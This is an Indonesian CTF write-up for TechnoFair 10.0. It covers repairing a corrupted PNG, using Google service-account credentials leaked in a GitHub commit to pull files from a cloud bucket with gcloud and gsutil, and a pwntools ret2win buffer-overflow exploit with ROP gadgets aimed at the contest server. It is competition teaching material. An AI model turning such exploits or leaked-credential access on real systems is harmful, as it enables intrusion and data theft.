+++
title = "TechnoFair 10.0"
date = 2023-07-10
draft = false
categories = ["CTF Writeups", "Not Translated"]
tags = ["technofair", "forensik", "misc", "pwn", "writeup"]
summary = "Writeup tim CP Enjoyer untuk TechnoFair 10.0 — hanya bagian Forensik (space mono), Misc (creds), dan Pwn (Terobozz)."
+++

Writeup dari tim **CP Enjoyer** untuk TechnoFair 10.0 — hanya bagian **Forensik** (space mono), **Misc** (creds), dan **Pwn** (Terobozz).

---

# Forensik

## space mono (323 pts)

{{< admonition quote "Deskripsi" >}}
If i could fall into the space, do you think … … … … would pass me by

**Author:** jsbach#7151

**Attachments:** `GLHF!!`

**Format Flag:** `TechnoFairCTF{random_string}`
{{< /admonition >}}

### Analisis awal

Diberikan file `chall` yang tidak diketahui jenisnya. Setelah melihat isi hex-nya menggunakan hex editor, terlihat ada byte-byte kebalikan dari chunk header pada PNG.

{{< image src="space-mono-hex-reversed.png" caption="Byte-byte kebalikan dari chunk header PNG" >}}

Jadi, kami membalik byte-nya dan menyimpannya di file baru.

{{< image src="space-mono-reverse-script.png" caption="Membalik byte file chall" >}}

File `new.png` tetap tidak bisa dibuka. Rupanya header chunk `IHDR` diganti dengan `00 00 00 00`.

{{< image src="space-mono-ihdr-zeroed.png" caption="Header chunk `IHDR` diubah menjadi nol" >}}

### Memperbaiki chunk-chunk PNG

Tetap tidak bisa dibuka, ternyata CRC chunk `IHDR`-nya salah.

{{< image src="space-mono-ihdr-restored.png" caption="Header `IHDR` diperbaiki" height=60 >}}
{{< image src="space-mono-pngcheck-crc.png" caption="CRC chunk `IHDR` salah" >}}
{{< image src="space-mono-ihdr-crc.png" caption="Nilai awal CRC chunk `IHDR`" >}}
{{< image src="space-mono-ihdr-crc2.png" caption="Nilai CRC chunk `IHDR` setelah diperbaiki" >}}

Header chunk-chunk `IDAT` diubah menjadi `TADI`. Setelah dikembalikan menjadi `IDAT`, file-nya masih tetap tidak bisa dibuka.

{{< image src="space-mono-pngcheck-tadi.png" caption="Terdeteksi chunk ilegal `TADI`" >}}
{{< image src="space-mono-replace-idat.png" caption="Find and replace `TADI` menjadi `IDAT`" >}}

Akhirnya muncul pesan `Invalid IDAT row-filter type`. Kami ingat pernah mendapatkan error ini ketika width PNG tidak sesuai. Maka, CRC chunk `IHDR` dikembalikan menjadi nilai semula, lalu width dan height di-bruteforce sampai menghasilkan CRC yang sama.

{{< image src="space-mono-pngcheck-rowfilter.png" caption="Error Invalid IDAT row-filter type" >}}

**solver.py**

```python
from zlib import crc32
import struct

f = open('new.png', 'rb').read()[12:29]
target = int('83D03504', 16)
# print(target)
for i in range(2000):
    for j in range(2000):
        if crc32(f[0:4] + struct.pack('>i', i) + struct.pack('>i', j) + f[12:17]) == target:
            print(hex(i), hex(j))
```

{{< image src="space-mono-solver-run.png" caption="Bruteforce width dan height berhasil" >}}

Maka, width-nya `0x69c` dan height-nya `0x46c`.

{{< image src="space-mono-width-height.png" caption="Nilai width dan height di dalam chunk IHDR" >}}

### Mendapatkan flag

Terakhir, chunk `IEND` diubah menjadi `I\x00\x00\x00`. Setelah dikembalikan menjadi `IEND`, file bisa dibuka dan terdapat flag.

{{< image src="space-mono-pngcheck-iend.png" caption="Terdeteksi header chunk yang tidak valid" >}}
{{< image src="space-mono-iend-before.png" caption="Nilai awal header `IEND`" >}}
{{< image src="space-mono-iend-after.png" caption="Nilai header `IEND` setelah diperbaiki" >}}
{{< image src="space-mono-flag.png" caption="Flag yang terdapat pada gambar" height=400 >}}

> Flag: `TechnoFairCTF{th3r3_1s_n0th1N9_3L53_0nLy_5p4c3_h3r3_d81d0481f0}`

---

# Misc

## creds (100 pts)

{{< admonition quote "Deskripsi" >}}
oops sorry i forgot gitignore, i have secret file on storage.

**Author:** boyyz

**Attachments:** https://github.com/boyyz

**Format Flag:** `TechnoFairCTF{}`
{{< /admonition >}}

### Analisis awal

Diberikan sebuah link github yang memiliki 2 commit. Pada commit pertama, file `something.json` berisi kredensial Google API. Dan pada commit kedua, sebagian besar kredensial dihapus. Setelah mencari-cari di Google tentang bagaimana cara menggunakan Google API, rupanya bisa menggunakan `gcloud-cli`. Setelah download `gcloud`, kami menjalankan perintah berikut untuk mendapatkan akses ke project pada Google API tadi.

**command.sh**

```bash
gcloud auth activate-service-account viewer@portofolio-web-391206.iam.gserviceaccount.com \
  --key-file=/home/zran/Downloads/technofair2023/misc/creds/my-profile/credentials.json
gcloud config set project portofolio-web-391206
```

{{< image src="creds-gcloud-auth.png" caption="Autentikasi menggunakan service account Google API" >}}

### Mendapatkan flag

Setelah mencari-cari, kita bisa menggunakan `gsutil` untuk melihat bucket-bucket yang bisa diakses. Kemudian kami langsung copy semua file ke lokal.

**command.sh**

```bash
gsutil ls gs://collections-jkt/WhatsApp*
gsutil cp gs://collections-jkt/* .
```

{{< image src="creds-gsutil-ls.png" caption="Melihat dan menyalin file pada bucket" >}}

Dan pada salah satu file jpeg-nya, terdapat flag.

{{< image src="creds-flag.png" caption="Flag ditemukan pada salah satu file" height=380 >}}

> Flag: `TechnoFairCTF{0sh1ku_Cum@n_S4tu}`

---

# Pwn

## Terobozz (100 pts)

{{< admonition quote "Deskripsi" >}}
One day don received a file, he was confused about who and what this file was from....he didn't know what to do, whether it was the origin, use or something he should be looking for...

**Author:** romy#2270

**Attachments:** `chall`

`nc 103.152.242.197 6001`
{{< /admonition >}}

### Analisis awal

Diberikan file `chall` yang merupakan ELF 64-bit, dynamically linked, not stripped. Mitigasi yang hidup hanya NX dan Partial RELRO.

{{< image src="terobozz-checksec.png" caption="Hasil checksec binary chall" >}}

Setelah di-decompile, terdapat fungsi `nama` yang memiliki vulnerability buffer overflow. Terdapat juga fungsi `apanich` yang akan menge-print `flag.txt` ke stdout kalau argumen yang diberikan sesuai. Sehingga, ini adalah ret2win biasa. Argumen dapat diatur dengan gadget `pop rdi` dan `pop rsi`.

### Mendapatkan flag

**solve.py**

```python
#!/usr/bin/env python3
from pwn import *
import sys
import os
import random

exe = ELF("./chall")
context.binary = exe
context.log_level = 'debug'

cmd = '''
set max-visualize-chunk-size 0x500
b *main
b *nama
'''

def find_offset(r, size=100):
    temp = context.log_level
    context.log_level = 'CRITICAL'
    r.sendline(cyclic(size))
    r.wait()
    r.close()
    core = r.corefile
    context.log_level = 'INFO'
    log.success(f'Crashed at : %s' % p32(core.fault_addr & 0xfffffff).decode())
    log.success(f'Offset     : %s' % cyclic_find(core.fault_addr & 0xfffffff))
    context.log_level = temp
    os.remove(core.path)

def conn(cmd):
    if 'i' in sys.argv:
        context.log_level = 'info'
    elif 'c' in sys.argv:
        context.log_level = 'critical'
    if '1' in sys.argv or 'local' in sys.argv:
        r = process([exe.path])
    elif '2' in sys.argv or 'server' in sys.argv:
        r = remote('103.152.242.197', 6001)
    else:
        if context.arch == 'i386' or context.arch == 'amd64':
            r = process([exe.path], aslr=False)
        else:
            port = str(random.randint(1000, 9999))
            cmd = 'file %s\ntarget remote localhost:%s' % (exe.path, port) + cmd
            if context.arch == 'arm' and context.endian == 'little':
                r = process(['qemu-arm-static', '-g', port, exe.path])
            elif context.arch == 'mips' and context.endian == 'little':
                r = process(['qemu-mipsel-static', '-g', port, exe.path])
            sleep(1)
            gdb.attach(r, cmd)
    return r

def main():
    r = conn(cmd)
    rop = ROP(exe)
    #find_offset(r)
    pop_rdi = rop.find_gadget(['pop rdi', 'ret']).address
    pop_rsi_r15 = rop.find_gadget(['pop rsi', 'pop r15', 'ret']).address
    payload = flat(cyclic(24), pop_rdi, 0xdeadbeefdeadbeef, pop_rsi_r15, 0xc0debabec0debabe, 1, exe.sym.apanich)
    r.sendlineafter(b'siapa? :', payload)
    context.log_level = 'debug'
    r.interactive()

if __name__ == '__main__':
    main()
```

{{< image src="terobozz-solve.png" caption="Berhasil memanggil fungsi apanich dan mendapatkan flag" >}}

> Flag: `TechnoFairCTF{congr4t5_bro000_g00d_j0bbbb5}`
